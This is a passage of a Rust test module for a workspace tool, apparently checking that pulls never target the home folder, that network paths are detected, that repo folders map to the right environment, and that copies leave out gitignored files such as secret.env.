                    ..Default::default()
                },
            )]),
            ..ws.clone()
        };
        let present_old = BTreeSet::from(["old".to_string()]);
        assert_eq!(
            pull_targets(&gone, None, None, &present_old).unwrap().len(),
            1
        );
        let web = pull_targets(&ws, None, Some("web"), &present).unwrap();
        assert_eq!(web[0].dest, canon(root.path()).join("web"));
        assert!(pull_targets(&ws, None, Some("nope"), &present).is_err());
    }

    #[test]
    fn a_clone_pulls_only_to_a_folder_you_name_never_home() {
        let ws = Workspace {
            url: Some("acme/web".into()),
            repos: BTreeMap::from([(
                "api".to_string(),
                config::Repo {
                    url: Some("acme/api".into()),
                    ..Default::default()
                },
            )]),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string()]);
        let e = pull_targets(&ws, None, None, &present).unwrap_err();
        assert!(format!("{e:#}").contains("--to"), "{e:#}");
        assert!(pull_targets(&ws, None, Some("api"), &present).is_err());
        let to = tempfile::tempdir().unwrap();
        let all = pull_targets(&ws, Some(to.path().to_path_buf()), None, &present).unwrap();
        assert_eq!(all.len(), 1);
        assert_eq!(all[0].dest, to.path());
        assert_eq!(all[0].skip, ["api"]);

        let home = directories::BaseDirs::new()
            .unwrap()
            .home_dir()
            .canonicalize()
            .unwrap();
        assert!(check_pull_dest(&home).is_err());
        assert!(check_pull_dest(home.parent().unwrap()).is_err());
        assert!(check_pull_dest(home.ancestors().last().unwrap()).is_err());
        assert!(check_pull_dest(&to.path().canonicalize().unwrap()).is_ok());
    }

    #[test]
    fn network_paths_are_told_from_local_ones() {
        for p in [
            r"\\server\share\proj",
            "//server/share/proj",
            r"\\?\UNC\server\share",
            r"\\.\UNC\server\share",
            r"/\server\share",
            "/net/host/export",
            "/NET/host",
            "/net",
        ] {
            assert!(network_path(p), "{p}");
        }
        for p in [
            "/Users/me/proj",
            r"C:\Users\me\proj",
            r"\\?\C:\Users\me\proj",
            "~/proj",
            "/network/x",
            "/home/me/net/x",
            "",
        ] {
            assert!(!network_path(p), "{p}");
        }
    }

    #[test]
    fn no_folder_a_config_names_pulls_into_home() {
        let home = directories::BaseDirs::new()
            .unwrap()
            .home_dir()
            .to_path_buf();
        let other = tempfile::tempdir().unwrap();
        let folder = |d: &Path| config::Repo {
            dir: Some(d.display().to_string()),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string()]);
        let at_home = Workspace {
            dir: Some(home.display().to_string()),
            ..Default::default()
        };
        assert!(pull_targets(&at_home, None, None, &present).is_err());
        let repo_above_home = Workspace {
            dir: Some(other.path().display().to_string()),
            repos: BTreeMap::from([("api".to_string(), folder(home.parent().unwrap()))]),
            ..Default::default()
        };
        let e = pull_targets(&repo_above_home, None, None, &present).unwrap_err();
        assert!(format!("{e:#}").contains("home folder"), "{e:#}");
        assert!(pull_targets(&repo_above_home, None, Some("api"), &present).is_err());
        assert!(pull_targets(&at_home, Some(home.clone()), None, &present).is_err());
    }

    #[test]
    fn with_no_env_here_the_error_names_the_envs_cloned_from_a_remote() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths {
            config: dir.path().join("config"),
            data: dir.path().join("data"),
        };
        let mut cfg = config::EnvConfig::default();
        cfg.workspace.url = Some("acme/web".into());
        EnvFile::create(&paths, "web", &cfg).unwrap();
        let mut own = config::EnvConfig::default();
        own.workspace.dir = Some(dir.path().display().to_string());
        EnvFile::create(&paths, "api", &own).unwrap();
        let msg = no_env_here(&paths, Path::new("/tmp"));
        assert!(msg.ends_with("so -e picks them: web"), "{msg}");
    }

    #[test]
    fn a_repo_folder_finds_its_env() {
        let dir = tempfile::tempdir().unwrap();
        let paths = Paths {
            config: dir.path().join("config"),
            data: dir.path().join("data"),
        };
        let platform = tempfile::tempdir().unwrap();
        let api = tempfile::tempdir().unwrap();
        let api_s = api.path().display().to_string();
        let mut cfg = config::EnvConfig::default();
        cfg.workspace.dir = Some(platform.path().display().to_string());
        cfg.workspace.repos.insert(
            "api".into(),
            config::Repo {
                dir: Some(api_s.clone()),
                ..Default::default()
            },
        );
        EnvFile::create(&paths, "platform", &cfg).unwrap();
        let sub = api.path().canonicalize().unwrap().join("src");
        assert_eq!(
            env_for_dir(&paths, &sub).unwrap().as_deref(),
            Some("platform")
        );
        // The repo's own env wins over the env it is a repo of.
        let mut own = config::EnvConfig::default();
        own.workspace.dir = Some(api_s.clone());
        EnvFile::create(&paths, "api", &own).unwrap();
        assert_eq!(env_for_dir(&paths, &sub).unwrap().as_deref(), Some("api"));
        // Two virtual workspaces with the same repo: neither is guessed.
        let mut virtual_ws = config::EnvConfig::default();
        virtual_ws.workspace.repos.insert(
            "api".into(),
            config::Repo {
                dir: Some(api_s),
                ..Default::default()
            },
        );
        EnvFile::create(&paths, "one", &virtual_ws).unwrap();
        EnvFile::create(&paths, "two", &virtual_ws).unwrap();
        std::fs::remove_file(paths.env_config("api")).unwrap();
        std::fs::remove_file(paths.env_config("platform")).unwrap();
        let e = env_for_dir(&paths, &sub).unwrap_err().to_string();
        assert!(e.contains("`one`, `two` all have this folder"), "{e}");
    }

    #[test]
    fn copies_leave_out_what_git_ignores() {
        let root = tempfile::tempdir().unwrap();
        let r = root.path();
        let git = |dir: &Path| {
            assert!(
                std::process::Command::new("git")
                    .args(["init", "-q"])
                    .arg(dir)
                    .status()
                    .unwrap()
                    .success()
            );
        };
        let write = |rel: &str, text: &str| {
            let p = r.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, text).unwrap();
        };
        git(r);
        write(".gitignore", "secret.env\n.kube/\n");
        write("a.txt", "a");
        write("secret.env", "TOKEN=x");
        write(".kube/config", "x");
        write("node_modules/x.js", "x");
        git(&r.join("sub"));
        write("sub/.gitignore", "*.tfvars\n");
        write("sub/main.tf", "x");
        write("sub/prod.tfvars", "x");
        let list = copy_list(r).unwrap();
        let has = |p: &str| list.iter().any(|(rel, _)| rel == Path::new(p));
        for p in [
            ".gitignore",
            "a.txt",
            ".git",
            ".git/HEAD",
            "sub",
            "sub/main.tf",
            "sub/.git/HEAD",
        ] {
            assert!(has(p), "{p} is copied: {list:?}");
        }
        for p in [
            "secret.env",
            ".kube/config",
            "node_modules/x.js",
            "sub/prod.tfvars",
        ] {
            assert!(!has(p), "{p} stays out");
        }
        // Folders come before what they hold.
        let at = |p: &str| {
            list.iter()
                .position(|(rel, _)| rel == Path::new(p))
                .unwrap()
        };
        assert!(at("sub") < at("sub/main.tf"));
        // A plain folder holding the repo copies everything else, and the repo through git.
        let outer = tempfile::tempdir().unwrap();
        std::fs::write(outer.path().join("notes.md"), "n").unwrap();
        std::fs::rename(r, outer.path().join("repo")).unwrap();
        let list = copy_list(outer.path()).unwrap();
        let has = |p: &str| list.iter().any(|(rel, _)| rel == Path::new(p));
        assert!(has("notes.md") && has("repo/a.txt") && !has("repo/secret.env"));
    }
}
